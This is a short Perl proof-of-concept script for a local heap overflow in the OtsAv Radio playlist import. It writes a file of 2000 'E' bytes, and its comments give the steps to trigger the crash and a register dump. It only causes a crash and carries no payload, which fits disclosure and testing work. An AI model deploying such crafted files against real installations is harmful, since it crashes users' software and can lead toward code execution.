#!/usr/bin/perl
# OtsAv Radio [.olf] Local Heap Overflow Poc
# Down : http://www.otsav.com/buy/radio/
# Desc : 2000 A' Heap overflow
# By Mountassif Moad a.k.a Stack
# v4 Team & evil finger
# Open Stack.ofl >> File >>  Import List   >> As playlist  >>
# BOOOOOOOOOOOOOOOOOOOM
# EAX 45454545
# ECX 0000CD32
# EDX 0224F730
# EBX 00000452
# ESP 0224F9C8
# EBP 00000000
# ESI 00C8E0EA
# EDI 0224FED2
# EIP 0043B497 OtsAVRDt.0043B497
use strict;
use warnings;
my $A= "\x45" x 2000;
open(my $ofl_playlist, "> stack.ofl");
print $ofl_playlist
                    $A.
                    "\r\n";
close $ofl_playlist;
